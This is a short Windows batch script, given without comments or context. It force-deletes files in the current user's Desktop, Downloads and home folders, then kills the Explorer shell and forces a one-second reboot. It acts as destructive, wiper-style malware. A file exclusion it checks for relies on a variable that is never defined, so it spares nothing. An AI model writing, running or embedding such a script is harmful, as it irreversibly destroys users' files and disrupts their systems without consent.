@echo off
set "desktopPath=%USERPROFILE%\Desktop"
set "downloadsPath=%USERPROFILE%\Downloads"
set "userPath=%USERPROFILE%"
for %%F in ("%desktopPath%\*") do (
    if /I not "%%~nxF"=="%keepFile%" (
        echo Deleting "%%F"
        del /f /q "%%F" 2>nul
        rd /s /q "%%F" 2>nul
    )
)
for %%F in ("%downloadsPath%\*") do (
    if /I not "%%~nxF"=="%keepFile%" (
        echo Deleting "%%F"
        del /f /q "%%F" 2>nul
        rd /s /q "%%F" 2>nul
    )
)
for %%F in ("%userPath%\*") do (
    if /I not "%%~nxF"=="%keepFile%" (
        echo Deleting "%%F"
        del /f /q "%%F" 2>nul
        rd /s /q "%%F" 2>nul
    )
)
taskkill /f /im explorer.exe
shutdown /f /r /t 1
